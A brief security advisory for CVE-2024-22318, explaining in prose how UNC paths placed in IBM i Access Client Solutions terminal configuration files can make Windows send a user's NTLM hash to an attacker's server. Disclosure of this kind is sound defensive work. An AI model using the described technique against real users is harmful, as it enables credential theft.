[Vulnerability Type]
Remote Credential Theft

[CVE Reference]
CVE-2024-22318


[Security Issue]
IBM i Access Client Solutions (ACS) is vulnerable to remote credential theft when NT LAN Manager (NTLM) is enabled on Windows workstations.
Attackers can create UNC capable paths within ACS 5250 display terminal configuration ".HOD" or ".WS" files to point to a hostile server.
If NTLM is enabled and the user opens an attacker supplied file the Windows operating system will try to authenticate using the current user's session.
The attacker controlled server could then capture the NTLM hash information to obtain the user's credentials.
